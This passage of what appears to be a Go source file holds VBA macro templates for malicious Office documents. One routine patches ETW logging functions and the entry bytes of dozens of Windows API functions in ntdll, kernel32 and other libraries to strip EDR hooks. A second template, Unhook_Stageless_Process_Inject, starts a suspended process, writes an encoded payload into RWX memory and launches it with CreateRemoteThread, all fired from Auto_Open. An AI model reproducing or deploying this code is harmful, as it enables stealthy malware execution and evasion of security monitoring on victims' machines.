	End Sub

	
	Private Sub {{.Variables.LLib}}()
	
		Dim {{.Variables.dll}} As Variant
		Dim {{.Variables.patch}} As Variant
		Dim {{.Variables.dataaddr}} As Variant
		#If Win64 Then 
		{{.Variables.dataaddr}} = Array("EtwNotificationRegister", "EtwEventRegister", "EtwEventWriteFull", "EtwEventWrite")
		{{.Variables.patch}} = Array("4833C0C3", "4833C0C3", "4833C0C3","4833C0C3")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("ntdll", {{.Variables.dataaddr}}, {{.Variables.patch}})
		
		{{.Variables.dataaddr}} = Array("CreateServiceA", "CreateServiceW")
		{{.Variables.patch}} = Array("4C88DC4883", "4C8BDC4883")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("advapi32", {{.Variables.dataaddr}}, {{.Variables.patch}})

		{{.Variables.dataaddr}} = Array("NtAddBootEntry", "NtAdjustPrivilegesToken", "NtAlertResumeThread", "NtAllocateVirtualMemory", "NtAllocateVirtualMemoryEx", "NtAlpcConnectPort", "NtAreMappedFilesTheSame", "NtClose", "NtCreateFile", "NtCreateKey", "NtCreateMutant", "NtCreateProcess", "NtCreateProcessEx", "NtCreateSection", "NtCreateThread", "NtCreateThreadEx", "NtCreateUserProcess", "NtDelayExecution", "NtDeleteBootEntry", "NtDeleteFile", "NtDeleteKey", "NtDeleteValueKey", "NtDeviceIoControlFile", "NtDuplicateObject", "NtFreeVirtualMemory", "NtGetContextThread", "NtLoadDriver", "NtMapUserPhysicalPages", "NtMapViewOfSection", "NtMapViewOfSectionEx", "NtModifyBootEntry", "NtOpenFile", "NtOpenKey", "NtOpenKeyEx", "NtOpenProcess", "NtOpenProcessToken", "NtOpenProcessTokenEx", "NtOpenThreadToken", "NtOpenThreadTokenEx", "NtProtectVirtualMemory", "NtQueryAttributesFile", "NtQueryFullAttributesFile", "NtQueryInformationProcess", "NtQueryInformationThread", "NtQuerySystemInformation", "NtQuerySystemInformationEx")
		{{.Variables.patch}} = Array("4c8bd1b86a000000", "4c8bd1b841000000", "4c8bd1b86e000000", "4c8bd1b818000000", "4c8bd1b876000000", "4c8bd1b879000000", "4c8bd1b88e000000", "4c8bd1b80f000000", "4c8bd1b855000000", "4c8bd1b81d000000", "4c8bd1b8b3000000", "4c8bd1b8b9000000", "4c8bd1b84d000000", "4c8bd1b84a000000", "4c8bd1b84e000000", "4c8bd1b8c1000000", "4c8bd1b8c8000000", "4c8bd1b834000000", "4c8bd1b8d0000000", "4c8bd1b8d2000000", "4c8bd1b8d3000000", "4c8bd1b8d6000000", "4c8bd1b807000000", "4c8bd1b83c000000", "4c8bd1b81e000000", "4c8bd1b8f2000000", "4c8bd1b805010000", "4c8bd1b813010000", "4c8bd1b828000000", "4c8bd1b814010000", "4c8bd1b815010000", "4c8bd1b833000000", "4c8bd1b812000000", "4c8bd1b820010000", "4c8bd1b826000000", "4c8bd1b828010000", "4c8bd1b830000000", "4c8bd1b824000000", "4c8bd1b82f000000", "4c8bd1b850000000", "4c8bd1b83d000000", "4c8bd1b846010000", "4c8bd1b819000000", "4c8bd1b825000000", "4c8bd1b836000000", "4c8bd1b861010000")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("ntdll", {{.Variables.dataaddr}}, {{.Variables.patch}})
		
		{{.Variables.dataaddr}} = Array("NtQueryVirtualMemory", "NtQueueApcThread", "NtQueueApcThreadEx", "NtReadVirtualMemory", "NtRenameKey", "NtResumeThread", "NtSetContextThread", "NtSetInformationFile", "NtSetInformationProcess", "NtSetInformationThread", "NtSetInformationVirtualMemory", "NtSetValueKey", "NtSuspendThread", "NtSystemDebugControl", "NtTerminateProcess", "NtTerminateThread", "NtUnmapViewOfSection", "NtUnmapViewOfSectionEx", "NtWriteFile", "NtWriteVirtualMemory")
		{{.Variables.patch}} = Array("4c8bd1b823000000", "4c8bd1b845000000", "4c8bd1b865010000", "4c8bd1b83f000000", "4c8bd1b872010000", "4c8bd1b852000000", "4c8bd1b88b010000", "4c8bd1b827000000", "4c8bd1b81c000000", "4c8bd1b80d000000", "4c8bd1b89e010000", "4c8bd1b860000000", "4c8bd1b8bc010000", "4c8bd1b8bd010000", "4c8bd1b82c000000", "4c8bd1b853000000", "4c8bd1b82a000000", "4c8bd1b8cc010000", "4c8bd1b808000000", "4c8bd1b83a000000")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("ntdll", {{.Variables.dataaddr}}, {{.Variables.patch}})
		
		{{.Variables.dataaddr}} = Array("CreateThread", "CreateProcessW", "CreateToolhelp32Snapshot", "CreateRemoteThread", "Toolhelp32ReadProcessMemory", "Process32First", "Process32Next", "LoadModule", "WinExec", "ReadConsoleA", "ReadConsoleW")
		{{.Variables.patch}} = Array("4C8BDC4883EC48", "E9335EF6C0CCCC", "8954241089", "4C8BDC4883EC48", "48895C2408", "48895C2418", "48895C2418", "405356574154", "E9F3B898C0", "FF257AC80500", "FF2562C80500")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("kernel32", {{.Variables.dataaddr}}, {{.Variables.patch}})

		{{.Variables.dataaddr}} = Array("FreeLibrary", "ReadFile", "LoadLibraryExW", "OpenProcess", "FindFirstFileExW", "FindFirstFileW", "LoadLibraryA", "FindFirstFileA", "LoadLibraryExA", "VirtualAlloc", "VirtualProtect", "CreateRemoteThreadEx", "K32EnumProcesses", "VirtualAllocEx", "VirtualProtectEx", "ResumeThread", "LoadLibraryW", "FindFirstFileExA", "ReadConsoleA", "ReadConsoleW", "WriteProcessMemory", "CreateProcessA", "CreateProcessW")
		{{.Variables.patch}} = Array("48895C2408", "48895C2410", "4055535748", "4C8BDC4883", "4055535641", "4883EC3883", "48895C2408", "48895C2418", "48895C2408", "4883EC3848", "488BC44889", "4C8BDC5356", "488BC44889", "4883EC3883", "488BC44889", "4883EC2848", "4533C033D2", "4055535657", "40534883EC", "40534883EC", "488BC44889", "4C8BDC4883EC68", "4C8BDC4883EC68")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("kernelbase", {{.Variables.dataaddr}}, {{.Variables.patch}})
	
		{{.Variables.dataaddr}} = Array("RegisterServiceCtrlHandlerW", "ControlService", "RegisterServiceCtrlHandlerExW", "RegisterServiceCtrlHandlerA", "ControlServiceExA", "DeleteService")
		{{.Variables.patch}} = Array("4533C94533", "4883EC484C", "41B9020000", "40534883EC", "488BC44889", "4883EC384C")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("sechost", {{.Variables.dataaddr}}, {{.Variables.patch}})
	
		{{.Variables.dataaddr}} = Array("connect", "listen", "bind", "WSAConnect", "accept", "WSAAccept")
		{{.Variables.patch}} = Array("488bc44889", "48895c2408", "48895c2408", "488bc44889", "4883ec3848", "48895c2408")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("ws2_32", {{.Variables.dataaddr}}, {{.Variables.patch}})
	
		#Else

		{{.Variables.dataaddr}} = Array("EtwNotificationRegister", "EtwEventRegister", "EtwEventWriteFull", "EtwEventWrite")
		{{.Variables.patch}} = Array("31C0C3", "31C0C3", "31C0C3","31C0C3")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("ntdll", {{.Variables.dataaddr}}, {{.Variables.patch}})

		{{.Variables.dataaddr}} = Array("CreateServiceA", "CreateServiceW")
		{{.Variables.patch}} = Array("8bff558bec5d", "8bff558bec5d")
		{{.Variables.boolresult }} = {{.Variables.Prep}}("advapi32", {{.Variables.dataaddr}}, {{.Variables.patch}})


		{{.Variables.dataaddr}} = Array("NtAddBootEntry", "NtAdjustPrivilegesToken", "NtAlertResumeThread", "NtAllocateVirtualMemory", "NtAllocateVirtualMemoryEx", "NtAlpcConnectPort", "NtAreMappedFilesTheSame", "NtClose", "NtCreateFile", "NtCreateKey", "NtCreateMutant", "NtCreateProcess", "NtCreateProcessEx", "NtCreateSection", "NtCreateThread", "NtCreateThreadEx", "NtCreateUserProcess", "NtDelayExecution", "NtDeleteBootEntry", "NtDeleteFile", "NtDeleteKey", "NtDeleteValueKey", "NtDeviceIoControlFile", "NtDuplicateObject", "NtFreeVirtualMemory", "NtGetContextThread", "NtLoadDriver", "NtMapUserPhysicalPages", "NtMapViewOfSection", "NtMapViewOfSectionEx", "NtModifyBootEntry", "NtOpenFile", "NtOpenKey", "NtOpenKeyEx", "NtOpenProcess", "NtOpenProcessToken", "NtOpenProcessTokenEx", "NtOpenThreadToken", "NtOpenThreadTokenEx", "NtProtectVirtualMemory", "NtQueryAttributesFile", "NtQueryFullAttributesFile", "NtQueryInformationProcess", "NtQueryInformationThread", "NtQuerySystemInformation", "NtQuerySystemInformationEx")
		{{.Variables.patch}} = Array("b86a000000ba7088", "b841000000ba7088", "b86e000700ba7088", "b818000000ba7088", "b876000000ba7088", "b879000000ba7088", "b88e000500ba7088", "b80f000300ba7088", "b855000000ba7088", "b81d000000ba7088", "b8b3000000ba7088", "b8b9000000ba7088", "b84d000000ba7088", "b84a000000ba7088", "b84e000000ba7088", "b8c1000000ba7088", "b8c8000000ba7088", "b834000600ba7088", "b8d0000000ba7088", "b8d2000000ba7088", "b8d3000000ba7088", "b8d6000000ba7088", "b807001b00ba7088", "b83c000000ba7088", "b81e000000ba7088", "b8f2000000ba7088", "b805010000ba7088", "b813010a00ba7088", "b828000000ba7088", "b814010000ba7088", "b815010000ba7088", "b833000000ba7088", "b812000000ba7088", "b820010000ba7088", "b826000000ba7088", "b828010000ba7088", "b830000000ba7088", "b824000000ba7088", "b82f000000ba7088", "b850000000ba7088", "b83d000000ba7088", "b846010000ba7088", "b819000000e80000", "b825000000ba7088", "b836000000ba7088", "b861010000ba7088", "b823000000ba7088")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("ntdll", {{.Variables.dataaddr}}, {{.Variables.patch}})
		
		{{.Variables.dataaddr}} = Array("NtQueryVirtualMemory", "NtQueueApcThread", "NtQueueApcThreadEx", "NtReadVirtualMemory", "NtRenameKey", "NtResumeThread", "NtSetContextThread", "NtSetInformationFile", "NtSetInformationProcess", "NtSetInformationThread", "NtSetInformationVirtualMemory", "NtSetValueKey", "NtSuspendThread", "NtSystemDebugControl", "NtTerminateProcess", "NtTerminateThread", "NtUnmapViewOfSection", "NtUnmapViewOfSectionEx", "NtWriteFile", "NtWriteVirtualMemory")
		{{.Variables.patch}} = Array("b845000000ba7088", "b865010000ba7088", "b83f000000ba7088", "b872010000ba7088", "b852000700ba7088", "b88b010000ba7088", "b827000000ba7088", "b81c000000ba7088", "b80d000000ba7088", "b89e010000ba7088", "b860000000ba7088", "b8bc010700ba7088", "b8bd010000ba7088", "b82c000700ba7088", "b853000700ba7088", "b82a000000ba7088", "b8cc010000ba7088", "b808001a00ba7088", "b83a000000ba7088")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("ntdll", {{.Variables.dataaddr}}, {{.Variables.patch}})


		{{.Variables.dataaddr}} = Array("LoadModule", "Process32First", "Process32Next", "ReadConsoleA", "ReadConsoleW", "Toolhelp32ReadProcessMemory", "CreateThread", "CreateToolhelp32Snapshot", "WinExec", "CreateProcessA", "CreateProcessW", "CreateRemoteThread", "ReadProcessMemory")
		{{.Variables.patch}} = Array("8bff558bec81ec30", "ff25480dd475cccc", "ff253c0dd475cccc", "8bff558bec57ff75", "8bff558becff751c", "8bff558bec6afe68", "8bff558bec83e4f8", "8bff558bec5dff25", "8bff558bec5dff25", "8bff558becff7520", "8bff558bec5dff25", "8bff558bec83ec0c", "8bff558bec83ec0c")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("kernel32", {{.Variables.dataaddr}}, {{.Variables.patch}})

		{{.Variables.dataaddr}} = Array("OpenProcess", "CreateRemoteThreadEx", "FindFirstFileA", "FindFirstFileExA", "FindFirstFileExW", "FindFirstFileW", "FreeLibrary", "K32EnumProcesses", "LoadLibraryExA", "LoadLibraryExW", "ReadFile", "ResumeThread", "VirtualAlloc", "VirtualAllocEx", "VirtualProtect", "VirtualProtectEx", "WriteProcessMemory")
		{{.Variables.patch}} = Array("8bff558bec83ec24", "68a0020000682867", "8bff558bec83e4f8", "8bff558bec83e4f8", "8bff558bec83e4f8", "8bff558bec33c050", "8bff558bec51538b", "6a1c68105cb375e8", "8bff558bec8b5508", "8bff558bec83e4f8", "8bff558bec6afe68", "8bff558bec518d45", "8bff558bec51518b", "8bff558bec6affff", "8bff558bec56ff75", "6888000000684020", "8bff558bec81ec30")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("kernelbase", {{.Variables.dataaddr}}, {{.Variables.patch}})

		{{.Variables.dataaddr}} = Array("RegisterServiceCtrlHandlerW", "ControlService", "RegisterServiceCtrlHandlerExW",  "RegisterServiceCtrlHandlerA", "ControlServiceExA", "DeleteService", "RegisterServiceCtrlHandlerExA",  "CreateServiceA", "CreateServiceW")
		{{.Variables.patch}} = Array("8bff558bec8b5510", "8bff558bec518b55", "6a2468e0431a76e8", "6a106840441a76e8", "8bff558bec518b55", "8bff558bec5dff25", "8bff558bec5dff25", "8bff558bece8f848", "8bff558bece818df")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("sechost", {{.Variables.dataaddr}}, {{.Variables.patch}})

		{{.Variables.dataaddr}} = Array("WSAAccept", "WSAConnect", "accept", "bind", "connect", "listen")
		{{.Variables.patch}} = Array("8bff558bec6a006a", "8bff558beca19884", "8bff558bec83ec1c", "8bff558bec83ec0c", "8bff558bec8b4d08", "6a1068e03c1a76e8")
		{{.Variables.boolresult}} = {{.Variables.Prep}}("ws2_32", {{.Variables.dataaddr}}, {{.Variables.patch}})

		#End if
	End Sub
	
	
	
	Function {{.Variables.Prep}}({{.Variables.dll}}, {{.Variables.addrarry}} As Variant, {{.Variables.patcharray}} As Variant) As Variant
		Dim {{.Variables.dllname}} As String
		Dim {{.Variables.proc}} As String
		{{.Variables.dllname}} = {{.Variables.dll}}
		For i = 0 To UBound({{.Variables.addrarry}})
			{{.Variables.proc}} = {{.Variables.addrarry}}(i)
			{{.Variables.buff}} = {{.Variables.patcharray}}(i)
 			{{.Variables.boolresult}} = {{.Variables.Unhook}}({{.Variables.dll}}, {{.Variables.proc}}, {{.Variables.buff}})
		Next
	End Function
	
	
	Function {{.Variables.Unhook}}({{.Variables.dll}}, {{.Variables.proc}}, {{.Variables.buff}}) As String
			Dim {{.Variables.pprocaddress}} As LongPtr
			Dim {{.Variables.bytecode}} As Long
			Dim {{.Variables.EDRByteArray}}() As Byte
			Dim {{.Variables.edrzL}} As Long
	
		
			{{.Variables.pprocaddress}} = {{.Variables.GetProcAddress}}({{.Variables.GetModuleHandleA}}({{.Variables.dll}}), {{.Variables.proc}})
			
			{{.Variables.bytecode}} = Len({{.Variables.buff}}) / 2
			ReDim {{.Variables.EDRByteArray}}(0 To {{.Variables.bytecode}})
			For i = 0 to {{.Variables.bytecode}} - 1
				If i = 0 Then
					{{.Variables.edrpos}} = i + 1
				Else
					{{.Variables.edrpos}} = i * 2 + 1
				End If
						{{.Variables.Value1}} = Mid({{.Variables.buff}}, {{.Variables.edrpos}}, 2)
						{{.Variables.EDRByteArray}}(i) = Val("&H" & {{.Variables.Value1}})
			Next
			{{.Variables.copyMemory}} ByVal -1, {{.Variables.pprocaddress}}, VarPtr({{.Variables.EDRByteArray}}(0)), UBound({{.Variables.EDRByteArray}}), {{.Variables.edrzL}}
	
	End Function
	
	
	Sub {{.Variables.Auto_Open}}()
	
		{{.Variables.Function}}
	End Sub
	
	
	
`

}

func Unhook_Stageless_Process_Inject() string {
	return `
	Public {{.Variables.EncodedPayload}} As String
	Public {{.Variables.DecodedValue}} As String
	Public Check As String
	Private Type PROCESS_INFORMATION
	hProcess As Long
	hThread As Long
	dwProcessId As Long
	dwThreadId As Long
	End Type
	Private Type STARTUPINFO
	cb As Long
	lpReserved As String
	lpDesktop As String
	lpTitle As String
	dwX As Long
	dwY As Long
	dwXSize As Long
	dwYSize As Long
	dwXCountChars As Long
	dwYCountChars As Long
	dwFillAttribute As Long
	dwFlags As Long 
	wShowWindow As Integer
	cbReserved2 As Integer
	lpReserved2 As Long
	hStdInput As Long
	hStdOutput As Long
	hStdError As Long
	End Type
	#If VBA7 Then
	Private Declare PtrSafe Function {{.Variables.CreateStuff}} Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
	Private Declare PtrSafe Function {{.Variables.AllocStuff}} Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
	Private Declare PtrSafe Function {{.Variables.WriteStuff}} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
	Private Declare PtrSafe Function {{.Variables.RunStuff}} Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
	Private Declare PtrSafe Function {{.Variables.GetProcAddress}}  Lib "kernel32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
	Private Declare PtrSafe Function {{.Variables.GetModuleHandleA}} Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As LongPtr
	#Else
	Private Declare Function {{.Variables.CreateStuff}} Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
	Private Declare Function {{.Variables.AllocStuff}} Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
	Private Declare Function {{.Variables.WriteStuff}} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
	Private Declare Function {{.Variables.RunStuff}} Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
	Private Declare Function {{.Variables.GetProcAddress}}  Lib "kernel32" Alias "GetProcAddress" (ByVal hModule As Long, ByVal lpProcNamee As String) As Long
	Private Declare Function {{.Variables.GetModuleHandleA}} Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
	#End If
	Sub {{.Variables.Function}}()
	Dim {{.Variables.myByte}} As Long, {{.Variables.myArray}} As Variant, {{.Variables.offset}} As Long
	Dim {{.Variables.pInfo}} As PROCESS_INFORMATION
	Dim {{.Variables.sInfo}} As STARTUPINFO
	Dim {{.Variables.sNull}} As String
	Dim {{.Variables.sProc}} As String
	{{.Variables.LLib}}
	#If VBA7 Then
	Dim {{.Variables.rwxpage}} As LongPtr, {{.Variables.res}} As LongPtr
	#Else
	Dim {{.Variables.rwxpage}} As Long, {{.Variables.res}} As Long
	#End If

	
	#If Win64 Then 
		{{.Variables.VBACode64}}
	{{.Variables.sProc}} = {{.Variables.process64}}
	
	#Else
	
		{{.Variables.VBACode32}}
	If Len(Environ("ProgramW6432")) > 0 Then
	{{.Variables.sProc}} = Environ("windir") & "\\SysWOW64\\{{.Variables.process32}}"
	Else
	{{.Variables.sProc}} = Environ("windir") & "\\System32\\{{.Variables.process32}}"
	
	end if 
	#End if

	{{.Variables.myArray}} = split({{.Variables.EncodedPayload}}, ",")
	{{.Variables.res}} = {{.Variables.RunStuff}}({{.Variables.sNull}}, {{.Variables.sProc}}, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, {{.Variables.sNull}}, {{.Variables.sInfo}}, {{.Variables.pInfo}})
	Check = {{.Variables.pInfo}}.hProcess
	{{.Variables.LLib}}
	{{.Variables.rwxpage}} = {{.Variables.AllocStuff}}({{.Variables.pInfo}}.hProcess, 0, UBound({{.Variables.myArray}}), &H1000, &H40)
	For {{.Variables.offset}} = LBound({{.Variables.myArray}}) To UBound({{.Variables.myArray}})
	{{.Variables.myByte}} = {{.Variables.myArray}}({{.Variables.offset}})
	{{.Variables.res}} = {{.Variables.WriteStuff}}({{.Variables.pInfo}}.hProcess, {{.Variables.rwxpage}} + {{.Variables.offset}}, {{.Variables.myByte}}, 1, ByVal 0&)
	Next {{.Variables.offset}}
	{{.Variables.res}} = {{.Variables.CreateStuff}}({{.Variables.pInfo}}.hProcess, 0, 0, {{.Variables.rwxpage}}, 0, 0, 0)
	End Sub
	Sub {{.Variables.Auto_Open}}()
	{{.Variables.Function}}
	End Sub


Sub {{.Variables.LLib}}()
	
Dim {{.Variables.dll}} As Variant
Dim {{.Variables.patch}} As Variant
Dim {{.Variables.dataaddr}} As Variant
#If Win64 Then 
{{.Variables.dataaddr}} = Array("EtwNotificationRegister", "EtwEventRegister", "EtwEventWriteFull", "EtwEventWrite")
{{.Variables.patch}} = Array("4833C0C3", "4833C0C3", "4833C0C3","4833C0C3")
{{.Variables.boolresult}} = {{.Variables.Prep}}("ntdll", {{.Variables.dataaddr}}, {{.Variables.patch}})

{{.Variables.dataaddr}} = Array("CreateServiceA", "CreateServiceW")
{{.Variables.patch}} = Array("4C88DC4883", "4C8BDC4883")
{{.Variables.boolresult}} = {{.Variables.Prep}}("advapi32", {{.Variables.dataaddr}}, {{.Variables.patch}})

{{.Variables.dataaddr}} = Array("NtAddBootEntry", "NtAdjustPrivilegesToken", "NtAlertResumeThread", "NtAllocateVirtualMemory", "NtAllocateVirtualMemoryEx", "NtAlpcConnectPort", "NtAreMappedFilesTheSame", "NtClose", "NtCreateFile", "NtCreateKey", "NtCreateMutant", "NtCreateProcess", "NtCreateProcessEx", "NtCreateSection", "NtCreateThread", "NtCreateThreadEx", "NtCreateUserProcess", "NtDelayExecution", "NtDeleteBootEntry", "NtDeleteFile", "NtDeleteKey", "NtDeleteValueKey", "NtDeviceIoControlFile", "NtDuplicateObject", "NtFreeVirtualMemory", "NtGetContextThread", "NtLoadDriver", "NtMapUserPhysicalPages", "NtMapViewOfSection", "NtMapViewOfSectionEx", "NtModifyBootEntry", "NtOpenFile", "NtOpenKey", "NtOpenKeyEx", "NtOpenProcess", "NtOpenProcessToken", "NtOpenProcessTokenEx", "NtOpenThreadToken", "NtOpenThreadTokenEx", "NtProtectVirtualMemory", "NtQueryAttributesFile", "NtQueryFullAttributesFile", "NtQueryInformationProcess", "NtQueryInformationThread", "NtQuerySystemInformation", "NtQuerySystemInformationEx")
{{.Variables.patch}} = Array("4c8bd1b86a000000", "4c8bd1b841000000", "4c8bd1b86e000000", "4c8bd1b818000000", "4c8bd1b876000000", "4c8bd1b879000000", "4c8bd1b88e000000", "4c8bd1b80f000000", "4c8bd1b855000000", "4c8bd1b81d000000", "4c8bd1b8b3000000", "4c8bd1b8b9000000", "4c8bd1b84d000000", "4c8bd1b84a000000", "4c8bd1b84e000000", "4c8bd1b8c1000000", "4c8bd1b8c8000000", "4c8bd1b834000000", "4c8bd1b8d0000000", "4c8bd1b8d2000000", "4c8bd1b8d3000000", "4c8bd1b8d6000000", "4c8bd1b807000000", "4c8bd1b83c000000", "4c8bd1b81e000000", "4c8bd1b8f2000000", "4c8bd1b805010000", "4c8bd1b813010000", "4c8bd1b828000000", "4c8bd1b814010000", "4c8bd1b815010000", "4c8bd1b833000000", "4c8bd1b812000000", "4c8bd1b820010000", "4c8bd1b826000000", "4c8bd1b828010000", "4c8bd1b830000000", "4c8bd1b824000000", "4c8bd1b82f000000", "4c8bd1b850000000", "4c8bd1b83d000000", "4c8bd1b846010000", "4c8bd1b819000000", "4c8bd1b825000000", "4c8bd1b836000000", "4c8bd1b861010000")
{{.Variables.boolresult}} = {{.Variables.Prep}}("ntdll", {{.Variables.dataaddr}}, {{.Variables.patch}})

{{.Variables.dataaddr}} = Array("NtQueryVirtualMemory", "NtQueueApcThread", "NtQueueApcThreadEx", "NtReadVirtualMemory", "NtRenameKey", "NtResumeThread", "NtSetContextThread", "NtSetInformationFile", "NtSetInformationProcess", "NtSetInformationThread", "NtSetInformationVirtualMemory", "NtSetValueKey", "NtSuspendThread", "NtSystemDebugControl", "NtTerminateProcess", "NtTerminateThread", "NtUnmapViewOfSection", "NtUnmapViewOfSectionEx", "NtWriteFile", "NtWriteVirtualMemory")
{{.Variables.patch}} = Array("4c8bd1b823000000", "4c8bd1b845000000", "4c8bd1b865010000", "4c8bd1b83f000000", "4c8bd1b872010000", "4c8bd1b852000000", "4c8bd1b88b010000", "4c8bd1b827000000", "4c8bd1b81c000000", "4c8bd1b80d000000", "4c8bd1b89e010000", "4c8bd1b860000000", "4c8bd1b8bc010000", "4c8bd1b8bd010000", "4c8bd1b82c000000", "4c8bd1b853000000", "4c8bd1b82a000000", "4c8bd1b8cc010000", "4c8bd1b808000000", "4c8bd1b83a000000")
{{.Variables.boolresult}} = {{.Variables.Prep}}("ntdll", {{.Variables.dataaddr}}, {{.Variables.patch}})

{{.Variables.dataaddr}} = Array("CreateThread", "CreateProcessW", "CreateToolhelp32Snapshot", "CreateRemoteThread", "Toolhelp32ReadProcessMemory", "Process32First", "Process32Next", "LoadModule", "WinExec", "ReadConsoleA", "ReadConsoleW")
{{.Variables.patch}} = Array("4C8BDC4883EC48", "E9335EF6C0CCCC", "8954241089", "4C8BDC4883EC48", "48895C2408", "48895C2418", "48895C2418", "405356574154", "E9F3B898C0", "FF257AC80500", "FF2562C80500")
{{.Variables.boolresult}} = {{.Variables.Prep}}("kernel32", {{.Variables.dataaddr}}, {{.Variables.patch}})

{{.Variables.dataaddr}} = Array("FreeLibrary", "ReadFile", "LoadLibraryExW", "OpenProcess", "FindFirstFileExW", "FindFirstFileW", "LoadLibraryA", "FindFirstFileA", "LoadLibraryExA", "VirtualAlloc", "VirtualProtect", "CreateRemoteThreadEx", "K32EnumProcesses", "VirtualAllocEx", "VirtualProtectEx", "ResumeThread", "LoadLibraryW", "FindFirstFileExA", "ReadConsoleA", "ReadConsoleW", "WriteProcessMemory", "CreateProcessA", "CreateProcessW")
{{.Variables.patch}} = Array("48895C2408", "48895C2410", "4055535748", "4C8BDC4883", "4055535641", "4883EC3883", "48895C2408", "48895C2418", "48895C2408", "4883EC3848", "488BC44889", "4C8BDC5356", "488BC44889", "4883EC3883", "488BC44889", "4883EC2848", "4533C033D2", "4055535657", "40534883EC", "40534883EC", "488BC44889", "4C8BDC4883EC68", "4C8BDC4883EC68")
{{.Variables.boolresult}} = {{.Variables.Prep}}("kernelbase", {{.Variables.dataaddr}}, {{.Variables.patch}})

{{.Variables.dataaddr}} = Array("RegisterServiceCtrlHandlerW", "ControlService", "RegisterServiceCtrlHandlerExW", "RegisterServiceCtrlHandlerA", "ControlServiceExA", "DeleteService")
{{.Variables.patch}} = Array("4533C94533", "4883EC484C", "41B9020000", "40534883EC", "488BC44889", "4883EC384C")
{{.Variables.boolresult}} = {{.Variables.Prep}}("sechost", {{.Variables.dataaddr}}, {{.Variables.patch}})

{{.Variables.dataaddr}} = Array("connect", "listen", "bind", "WSAConnect", "accept", "WSAAccept")
{{.Variables.patch}} = Array("488bc44889", "48895c2408", "48895c2408", "488bc44889", "4883ec3848", "48895c2408")
{{.Variables.boolresult}} = {{.Variables.Prep}}("ws2_32", {{.Variables.dataaddr}}, {{.Variables.patch}})


#Else

{{.Variables.dataaddr}} = Array("EtwNotificationRegister", "EtwEventRegister", "EtwEventWriteFull", "EtwEventWrite")
{{.Variables.patch}} = Array("31C0C3", "31C0C3", "31C0C3","31C0C3")
{{.Variables.boolresult}} = {{.Variables.Prep}}("ntdll", {{.Variables.dataaddr}}, {{.Variables.patch}})

{{.Variables.dataaddr}} = Array("CreateServiceA", "CreateServiceW")
{{.Variables.patch}} = Array("8bff558bec5d", "8bff558bec5d")
{{.Variables.boolresult }} = {{.Variables.Prep}}("advapi32", {{.Variables.dataaddr}}, {{.Variables.patch}})



{{.Variables.dataaddr}} = Array("NtAddBootEntry", "NtAdjustPrivilegesToken", "NtAlertResumeThread", "NtAllocateVirtualMemory", "NtAllocateVirtualMemoryEx", "NtAlpcConnectPort", "NtAreMappedFilesTheSame", "NtClose", "NtCreateFile", "NtCreateKey", "NtCreateMutant", "NtCreateProcess", "NtCreateProcessEx", "NtCreateSection", "NtCreateThread", "NtCreateThreadEx", "NtCreateUserProcess", "NtDelayExecution", "NtDeleteBootEntry", "NtDeleteFile", "NtDeleteKey", "NtDeleteValueKey", "NtDeviceIoControlFile", "NtDuplicateObject", "NtFreeVirtualMemory", "NtGetContextThread", "NtLoadDriver", "NtMapUserPhysicalPages", "NtMapViewOfSection", "NtMapViewOfSectionEx", "NtModifyBootEntry", "NtOpenFile", "NtOpenKey", "NtOpenKeyEx", "NtOpenProcess", "NtOpenProcessToken", "NtOpenProcessTokenEx", "NtOpenThreadToken", "NtOpenThreadTokenEx", "NtProtectVirtualMemory", "NtQueryAttributesFile", "NtQueryFullAttributesFile", "NtQueryInformationProcess", "NtQueryInformationThread", "NtQuerySystemInformation", "NtQuerySystemInformationEx")
